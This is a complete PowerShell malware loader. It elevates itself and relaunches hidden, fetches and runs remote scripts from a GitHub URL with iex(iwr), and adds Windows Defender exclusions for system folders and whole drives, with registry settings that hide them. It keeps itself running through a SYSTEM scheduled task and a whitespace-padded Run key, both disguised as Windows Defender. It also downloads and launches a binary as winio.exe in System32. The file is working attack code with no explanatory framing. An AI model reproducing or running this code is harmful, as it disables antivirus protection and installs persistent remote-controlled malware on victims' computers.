Add-Type -TypeDefinition @"
using System; 
using System.Runtime.InteropServices; 
public class WindowHelper 
{ 
    [DllImport("user32.dll")] 
    public static extern IntPtr GetForegroundWindow(); 

    [DllImport("user32.dll")] 
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); 

    public const int SW_HIDE = 0; 
    public static void HideWindow() 
    { 
        IntPtr handle = GetForegroundWindow(); ShowWindow(handle, SW_HIDE); 
    }
}
"@; 
#[WindowHelper]::HideWindow();

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    $newProc = Start-Process -FilePath "powershell.exe" -ArgumentList ("-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command iex(iwr 'https://raw.githubusercontent.com/aodfs/0/main/0' -UseBasicP)") -Verb RunAs -PassThru;
    $newProc.WaitForExit();
    exit;
}
else
{
    $paths = @(
        "C:\Program Files\Windows Defender",
        "C:\Program Files\Windows Defender Advanced Threat Protection",
        "C:\Program Files\Windows NT",
        "C:\Program Files\Windows Security",
        "C:\Program Files\WindowsPowerShell",

        "C:\Program Files (x86)\Internet Explorer",
        "C:\Program Files (x86)\Microsoft",
        "C:\Program Files (x86\Windows Defender",
        "C:\Program Files (x86)\Windows NT",
        "C:\Program Files (x86)\WindowsPowerShell",

        "C:\Windows\Boot",
        "C:\Windows\CSC",
        "C:\Windows\debug",
        "C:\Windows\diagnostics",
        "C:\Windows\Logs",
        "C:\Windows\PLA",
        "C:\Windows\Resources",
        "C:\Windows\security",
        "C:\Windows\System",
        "C:\Windows\System32",
        "C:\Windows\SystemApps",
        "C:\Windows\SystemResources",
        "C:\Windows\SystemTemp",
        "C:\Windows\SysWOW64",
        "C:\Windows\Tasks",
        "C:\Windows\WinSxS",

        "C:\",
        "D:\"
    );
    foreach($path in $paths)
    {
        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue;
    };

    $keys = @(
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\HideExclusionsFromLocalAdmins",
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\HideExclusions"
    );
    
    foreach ($key in $keys) 
    {
        try 
        {
            if (-not (Test-Path $key -ErrorAction SilentlyContinue)) 
            {
                New-Item -Path $key -Force -ErrorAction SilentlyContinue | Out-Null;

                New-ItemProperty -Path $key -Name "Default" -Value 1 -PropertyType "DWORD" -Force -ErrorAction SilentlyContinue | Out-Null;
            } 
            else 
            {
                Set-ItemProperty -Path $key -Name "Default" -Value 1 -Force -ErrorAction SilentlyContinue;
            }
        } 
        catch 
        {
            continue;
        }
    };

    try
    {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-NoProfile -ExecutionPolicy Bypass -Command "iex(iwr ''https://raw.githubusercontent.com/aodfs/0/main/2'' -UseBasicP).Content"'
        $trigger = New-ScheduledTaskTrigger -AtLogOn;
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest;
        $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal;
        Register-ScheduledTask -TaskName "Windows Defender" -InputObject $task -TaskPath "\Microsoft\Windows\Windows Defender\" -Force;
    }
    catch 
    {
    };
    
    try
    {
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftWindowsDefender" -Value "                                                                                                                                                                                        powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command iex(iwr 'https://raw.githubusercontent.com/aodfs/0/main/2' -UseBasicP)";
    }
    catch
    {
    };

    $filePaths = @(
        'C:\Windows\System32\winio.exe', 
        'C:\Windows\System32\SafeBoot\winio.exe'
    );
    
    foreach ($filePath in $filePaths) 
    {
        try 
        {
            if (Test-Path $filePath) 
            {
                $process = Get-Process -ErrorAction Continue | Where-Object 
                { 
                    $_.Path -eq $filePath;
                }
                
                if ($process) 
                {
                    $process | Stop-Process -Force -ErrorAction Continue;
                }
            }
        } 
        catch 
        {
            # Handle the error if necessary
        };
    }

    $mutexName = "44b6c65a-d844-4fa9-9d68-a7df5ab8b127";
    try
    {
        $mutex = [System.Threading.Mutex]::OpenExisting($mutexName);
        
        if ($mutex) 
        {
            $processes = Get-Process | Where-Object {
                $_.Modules | Where-Object {
                    $_.FileName -eq "C:\Windows\System32\winio.exe" -or 
                    $_.FileName -eq "C:\Windows\System32\SafeBoot\winio.exe"
                }
            }
    
            foreach ($process in $processes) 
            {
                Write-Output "Terminating process $($process.Id) holding the mutex $mutexName"
                Stop-Process -Id $process.Id -Force;
            }
    
            $mutex.ReleaseMutex();
            $mutex.Dispose();
        }
    } 
    catch 
    {
        # Handle exceptions if necessary
    };    

    try 
    {
        if (Test-Path "C:\\Windows\\System32\\SafeBoot\\winio.exe")
        {
            Remove-Item -Path "C:\\Windows\\System32\\SafeBoot\\winio.exe" -Force -Recurse -ErrorAction Continue;
        }

        if (Test-Path "C:\\Windows\\System32\\winio.exe")
        {
            Remove-Item -Path "C:\\Windows\\System32\\winio.exe" -Force -Recurse -ErrorAction Continue;
        }
    } 
    catch 
    {
    }

    try
    {
        Start-BitsTransfer -Source 'https://raw.githubusercontent.com/aodfs/0/main/1' -Destination 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;
    
        if (-not (Test-Path 'C:\Windows\System32\winio.exe'))
        {
            Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aodfs/0/main/1' -OutFile 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;
        };
    }
    catch
    {
    }
    
    if (Test-Path "C:\Windows\System32\winio.exe") 
    {
        try 
        {
            Start-Process -FilePath "C:\Windows\System32\winio.exe" -Verb RunAs -WindowStyle Hidden -ErrorAction Stop
        }
        catch 
        {
            try
            {
                Start-Process -FilePath "C:\Windows\System32\winio.exe" -ErrorAction SilentlyContinue
            }
            catch
            {
            }
        }
    }
    else 
    {
        try 
        {
            Start-Process -FilePath "C:\\Windows\\System32\\winio.exe" -Verb RunAs -WindowStyle Hidden -ErrorAction Stop
        }
        catch 
        {
            Start-Process -FilePath "C:\\Windows\\System32\\winio.exe" -ErrorAction SilentlyContinue
        }
    }
};

exit;
